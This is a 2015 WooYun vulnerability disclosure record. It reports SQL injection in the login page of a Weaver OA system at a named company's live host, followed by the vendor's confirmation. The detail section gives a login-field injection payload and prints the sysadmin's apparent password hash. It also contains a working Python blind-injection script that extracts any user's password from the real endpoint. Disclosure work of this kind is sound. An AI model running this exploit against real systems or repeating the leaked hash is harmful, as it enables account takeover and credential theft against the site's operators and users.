{"id": 70663, "wybug_id": "wooyun-2015-0134990", "wybug_title": "魔方某系统存在SQL注入，可任意登录（附验证脚本）", "wybug_corp": "52mf.com.cn", "wybug_author": "浮萍", "wybug_date": "2015-08-18 14:10", "wybug_open_date": "2015-10-02 15:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向公众公开  简要描述： SQL注入 详细说明：  泛微系统http://oa.52mf.cn:89/login.do\n\n当用户名存在密码错误提示登录密码不正确\n\n用户名不存在时提示用户未找到\n\n\nsysadmin'and length(password)=32 and '1'='1\n\n\n\n\nsysadmin密码为025C29C5953E75EB9733706A562427E2   漏洞证明：  脚本如下\nimport urllibimport urllib2dic = '0123456789ABCDEF'pwd = ''for i in range(32):\tfor j in dic:\t\tusername = \"sysadmin' and(substr(password,\"+str(i+1)+\",1)='\"+j+\"') and 'a'='a\"\t\t#username = \"sysadmin' and 'a'='a\"\t\tvalues = {'loginid':username,'password':'z','authcode':'','dynapass':'','tokenpass':'','clienttype':'Webclient','clientver':4.5,'language':'','country':'','verify':'','needdyna':''}\t\t#print values\t\tdata = urllib.urlencode(values)\t\treq = urllib2.Request(\"http://oa.52mf.cn:89/verifyLogin.do\",data)\t\tresponse = urllib2.urlopen(req)\t\thtml = response.read()\t\t#print html\t\tfd = html.count('102')\t\t#print '-->'+str(fd)\t\t\t\tif fd>0 :\t\t\tpwd = pwd +j\t\t\tprint pwd\t\t\tbreak\n获取其他人员密码 只需更改username = \"sysadmin' and(substr(password,\"+str(i+1)+\",1)='\"+j+\"') and 'a'='a\"中的sysadmin即可   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-18 15:05 厂商回复： 谢谢提醒，我们会处理这个漏洞的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}